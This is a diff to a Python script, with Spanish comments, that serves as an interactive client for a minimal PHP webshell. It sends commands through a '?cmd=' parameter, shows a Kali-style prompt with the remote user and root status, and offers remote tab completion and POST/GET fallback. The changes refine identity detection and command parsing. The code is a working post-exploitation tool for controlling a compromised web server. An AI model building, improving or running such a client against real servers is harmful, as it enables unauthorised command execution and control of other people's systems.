@@ -5,9 +5,10 @@ Cliente interactivo para webshell PHP mínima (?cmd=...):
 - Prompt estilo Kali mostrando SOLO el usuario (via whoami); '#' si root
 - Arranca en el directorio donde está alojada la webshell
 - Autocompletado con Tab (rutas remotas) con caché e invalidación inteligente
-- Historial de sesión (flechas ↑/↓) con readline nativo
-- Parseo robusto con marcadores
-- Transporte AUTO
+- Historial de sesión (flechas ↑/↓) sin duplicados (readline nativo)
+- Parseo robusto con marcadores (ignora HTML extra)
+- Transporte AUTO: prueba POST, si falla, usa GET.
+- Bloqueo de comandos interactivos sin TTY (su, ssh, nano)
 """
 
 import time
@@ -21,13 +22,13 @@ from typing import List, Tuple, Optional, Dict
 
 # ======================== Configuración principal ============================
 
-URL = "https://tu-dominio.tld/ruta/a/shell.php"   
-TIMEOUT = 10                                       
-REMOTE_CMD_TIMEOUT = 8                             
-TRANSPORT = "auto"
-VERIFY_TLS = True                                  
+URL = "https://tu-dominio.tld/ruta/a/shell.php"   # <-- Cambia esto por tu URL real
+TIMEOUT = 10                                       # Timeout de red (segundos)
+REMOTE_CMD_TIMEOUT = 8                             # Timeout remoto por comando
+TRANSPORT = "auto"                                 # auto / post / get
+VERIFY_TLS = True                                  # Verificar certificado TLS
 
-# Comandos prohibidos en una webshell sin TTY porque cuelgan la petición
+# Comandos prohibidos en una webshell sin TTY porque cuelgan la petición HTTP
 INTERACTIVE_BANS = {"su", "ssh", "nano", "vim", "vi", "top", "htop", "less", "more"}
 
 # ============================ Marcadores de salida ===========================
@@ -100,7 +101,7 @@ class WebShellClient:
 
         self.sess = requests.Session()
         self.sess.headers.update({
-            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) WebShellClient/2.0",
+            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) WebShellClient/2.1",
             "Accept": "*/*",
         })
         
@@ -233,9 +234,34 @@ echo __NOTFOUND__
     def identity(self, refresh: bool = False) -> Identity:
         if (not refresh) and self._ident:
             return self._ident
-        out, _ = self._exec('who="$(whoami 2>/dev/null || id -un 2>/dev/null || echo user)"; uid="$(id -u 2>/dev/null || echo -1)"; printf "%s\\n%s\\n" "$who" "$uid"', force_cwd="/")
-        lines = [ln.strip() for ln in out.splitlines()] + ["", ""]
-        self._ident = Identity(user=lines[0] or "user", uid=int(lines[1]) if re.fullmatch(r"-?\d+", lines[1]) else -1, ts=time.time())
+
+        # Comando directo y simple para evitar problemas de escape o evaluación Bash
+        cmd = "id -un 2>/dev/null || whoami 2>/dev/null || echo user; id -u 2>/dev/null || echo -1"
+        out, _ = self._exec(cmd, force_cwd="/")
+        
+        lines = [ln.strip() for ln in out.splitlines() if ln.strip()]
+        
+        user = "user"
+        uid = -1
+        
+        if len(lines) >= 1:
+            user = lines[0]
+        if len(lines) >= 2:
+            try:
+                uid = int(lines[1])
+            except ValueError:
+                pass
+                
+        # Fallback de emergencia si devuelve "user"
+        if user == "user":
+            out_fallback, _ = self._exec("echo $USER", force_cwd="/")
+            lines_fb = [ln.strip() for ln in out_fallback.splitlines() if ln.strip()]
+            if lines_fb:
+                fb_user = lines_fb[-1]
+                if fb_user and fb_user != "$USER":
+                    user = fb_user
+                
+        self._ident = Identity(user=user, uid=uid, ts=time.time())
         return self._ident
 
     def cd(self, path: str) -> Tuple[bool, str]:
@@ -273,9 +299,13 @@ echo __NOTFOUND__
         line = line.strip()
         if not line: return ""
 
-        first_token = shlex.split(line)[0] if line else ""
+        try:
+            first_token = shlex.split(line)[0] if line else ""
+        except Exception:
+            first_token = line.split()[0] if line else ""
+
         if first_token in INTERACTIVE_BANS:
-            return f"[!] El comando '{first_token}' requiere una TTY y colgará la webshell. Omitido por seguridad."
+            return f"[!] El comando '{first_token}' requiere una TTY interactiva y colgará la webshell. Omitido por seguridad."
 
         if line in ("exit", "quit"): raise KeyboardInterrupt()
         if line == "pwd": return self.cwd
@@ -330,10 +360,13 @@ def main():
     try:
         while True:
             ident = client.identity()
-            prompt = f"┌──({ident.user})-[{client.cwd}]\n└─{'#' if ident.uid == 0 else '$'} "
+            # Mostramos '#' si es root o tiene uid 0, sino '$'
+            sym = '#' if ident.uid == 0 or ident.user == "root" else '$'
+            prompt = f"┌──({ident.user})-[{client.cwd}]\n└─{sym} "
             try:
                 line = input(prompt)
-                if out := client.run(line): print(out)
+                if out := client.run(line): 
+                    print(out)
             except requests.RequestException as e:
                 print(f"[!] Error de red: {e}")
     except (KeyboardInterrupt, EOFError):
